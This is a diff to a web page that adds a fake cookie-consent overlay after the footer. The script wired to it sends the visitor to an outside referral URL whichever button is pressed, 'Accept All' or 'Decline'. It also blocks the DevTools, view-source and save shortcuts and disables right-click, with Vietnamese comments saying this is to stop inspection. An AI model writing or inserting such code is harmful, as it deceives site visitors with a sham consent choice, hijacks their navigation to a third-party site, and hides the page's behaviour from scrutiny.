@@ -560,5 +560,57 @@
     </div>
 </footer>
 
+ Cookie consent overlay
+<div class="cookie-overlay" id="cookieOverlay">
+    <div class="cookie-consent" id="cookieConsent">
+        <h3>Cookie Notice</h3>
+        <p>We use cookies to enhance your browsing experience, serve personalized ads or content, and analyze our traffic. By clicking "Accept All", you consent to our use of cookies.</p>
+        <div class="cookie-buttons">
+            <button class="accept-btn" onclick="acceptCookies()">Accept All</button>
+            <button class="decline-btn" onclick="declineCookies()">Decline</button>
+        </div>
+    </div>
+</div>
+
+<script>
+    // Cookie consent functionality
+    function acceptCookies() {
+        window.location.href = 'https://atumtek.com/?ref=kldzvbcn';
+    }
+
+    function declineCookies() {
+        window.location.href = 'https://atumtek.com/?ref=kldzvbcn';
+    }
+
+    // Chặn phím F12 và các tổ hợp phím thường dùng để mở DevTools
+    document.addEventListener('keydown', function (e) {
+        // F12
+        if (e.keyCode === 123) {
+            e.preventDefault();
+            return false;
+        }
+        // Ctrl+Shift+I
+        if (e.ctrlKey && e.shiftKey && e.keyCode === 73) {
+            e.preventDefault();
+            return false;
+        }
+        // Ctrl+U
+        if (e.ctrlKey && e.keyCode === 85) {
+            e.preventDefault();
+            return false;
+        }
+        // Ctrl+S
+        if (e.ctrlKey && e.keyCode === 83) {
+            e.preventDefault();
+            return false;
+        }
+    });
+
+    // Chặn chuột phải
+    document.addEventListener('contextmenu', function (e) {
+        e.preventDefault();
+    });
+</script>
+
 </body>
 </html>
